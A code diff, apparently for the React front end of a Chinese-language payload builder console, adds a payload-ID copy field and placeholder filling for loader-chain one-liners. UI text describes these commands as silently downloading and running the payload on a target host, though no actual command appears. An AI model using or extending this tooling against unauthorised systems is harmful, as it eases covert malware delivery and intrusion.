@@ -578,6 +578,19 @@ export function Builds() {
               <h3>上次构建</h3>
               <div className="result-info">
                 <div className="result-item"><span className="result-label">名称</span><span className="result-value">{buildResult.name}</span></div>
+                <div className="result-item">
+                  <span className="result-label">载荷 ID</span>
+                  <span className="result-value" style={{ display: 'inline-flex', alignItems: 'center', gap: 6 }}>
+                    <code style={{ fontFamily: 'var(--font-mono)', fontSize: 11 }}>{buildResult.id}</code>
+                    <button
+                      onClick={() => copyToClipboard(buildResult.id)}
+                      title="复制载荷 ID（加载器链里的 <DLL载荷ID> / <shellcode载荷ID> 就是填它）"
+                      style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--text-dim)', padding: 0, display: 'flex' }}
+                    >
+                      <Copy size={13} />
+                    </button>
+                  </span>
+                </div>
                 <div className="result-item"><span className="result-label">格式</span><span className="result-value">{buildResult.format}</span></div>
                 <div className="result-item"><span className="result-label">大小</span><span className="result-value">{(buildResult.size / 1024).toFixed(2)} KB</span></div>
                 <div className="result-item server-url"><span className="result-label">服务器地址</span><span className="result-value">{buildResult.serverUrl}</span></div>
@@ -629,6 +642,8 @@ export function Builds() {
                     set={buildResult.oneLinerSet}
                     copiedCmd={copiedCmd}
                     onCopy={copyCommand}
+                    buildId={buildResult.id}
+                    format={buildResult.format}
                   />
                   <p className="oneliner-hint">
                     在目标主机上执行任一命令即可静默下载并运行该载荷；下载地址由服务端按目标机可达性解析（不是控制台的访问地址）。
@@ -1329,14 +1344,29 @@ function OneLinerList({
   loading,
   copiedCmd,
   onCopy,
+  buildId,
+  format,
 }: {
   set: OneLinerSet | null
   loading?: boolean
   copiedCmd: string | null
   onCopy: (cmd: string) => void
+  /** 本次构建的载荷 ID：用于自动/手动替换命令里的 <DLL载荷ID> / <shellcode载荷ID> */
+  buildId?: string
+  format?: string
 }) {
   const [query, setQuery] = useState('')
   const [kind, setKind] = useState<'all' | 'direct' | 'loader'>('all')
+  // 载荷 ID 覆盖值：默认用本次构建的 ID（仅当本次载荷就是 dll/shellcode 时才适用）
+  const [idOverride, setIdOverride] = useState('')
+  const currentIsDLL = (format || '').toLowerCase() === 'dll'
+  const currentIsSC = ['shellcode', 'shellcode_bin'].includes((format || '').toLowerCase())
+  const effectiveId = idOverride.trim() || ((currentIsDLL || currentIsSC) ? (buildId || '') : '')
+  // 命令里的占位符替换（服务端在"当前载荷格式匹配"时已经填好真实地址，这里是兜底与手工指定）
+  const fillIds = (cmd: string) =>
+    effectiveId
+      ? cmd.split('<DLL载荷ID>').join(effectiveId).split('<shellcode载荷ID>').join(effectiveId)
+      : cmd
 
   if (loading) {
     return (
@@ -1403,11 +1433,31 @@ function OneLinerList({
         <button
           className="oneliner-copy-btn"
           title="复制当前筛选出的全部命令"
-          onClick={() => onCopy(visible.map((v) => v.command).join('\r\n'))}
+          onClick={() => onCopy(visible.map((v) => fillIds(v.command)).join('\r\n'))}
           disabled={visible.length === 0}
         >
           <Copy size={14} /> 复制全部（{visible.length}）
         </button>
+      </div>
+
+      {/* 载荷 ID 填充：加载器链需要 dll / shellcode 格式载荷的 ID。
+          当前载荷就是那个格式时服务端已直接填入真实下载地址；否则在这里粘一次 ID 即可
+          （ID 在「上次构建」面板、载荷列表、或构建响应的 download_url 里都能看到）。 */}
+      <div className="oneliner-idfill">
+        <span className="oneliner-idfill-label">载荷 ID 填充</span>
+        <input
+          value={idOverride}
+          onChange={(e) => setIdOverride(e.target.value)}
+          placeholder={buildId ? `留空 = 用本次构建（${buildId}）` : '如 build-1789458791413714300'}
+        />
+        {(currentIsDLL || currentIsSC) && buildId ? (
+          <Badge tone="ok">已自动填入本次 {format} 载荷</Badge>
+        ) : (
+          <span className="oneliner-hint" style={{ margin: 0 }}>
+            含 <code>&lt;DLL载荷ID&gt;</code> / <code>&lt;shellcode载荷ID&gt;</code> 的命令会用它替换；
+            按 <code>dll</code> 格式构建的载荷会自动带上真实 ID。
+          </span>
+        )}
       </div>
 
       {visible.length === 0 && <p className="oneliner-hint">没有匹配的命令，换个关键字或切回「全部」。</p>}
@@ -1425,12 +1475,12 @@ function OneLinerList({
                   {level && <RiskBadge level={level} />}
                   <span className="oneliner-tag">{v.shell}</span>
                 </span>
-                <button className="oneliner-copy-btn" onClick={() => onCopy(v.command)} title="复制该命令">
+                <button className="oneliner-copy-btn" onClick={() => onCopy(fillIds(v.command))} title="复制该命令">
                   {copiedCmd === v.command ? <CheckCircle2 size={14} /> : <Copy size={14} />}
                   {copiedCmd === v.command ? '已复制' : '复制'}
                 </button>
               </div>
-              <code className="oneliner-code">{v.command}</code>
+              <code className="oneliner-code">{fillIds(v.command)}</code>
               {v.desc && <p className="oneliner-hint">{v.desc}</p>}
               {/* 加载器链的前置条件与风险提示（服务端 note 字段，普通变体为空） */}
               {v.note && (
